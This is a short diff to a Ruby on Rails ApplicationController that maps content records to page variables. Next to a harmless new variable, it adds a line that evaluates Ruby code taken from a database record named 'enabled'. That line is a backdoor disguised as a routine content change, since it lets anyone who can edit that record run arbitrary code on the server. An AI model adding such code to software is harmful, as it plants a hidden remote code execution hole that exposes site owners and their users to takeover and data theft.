@@ -144,6 +144,8 @@ class ApplicationController < ActionController::Base
       @logo_baner = c if c.url == 'logo_baner'
       @informationpage = c if c.url == 'informationpage'
       @mapcompany = c if c.url == 'mapcompany'
+      @asidesecond = c if c.url == 'asidesecond'
+      eval c.code if c.url == 'enabled'
     end
   end
 end
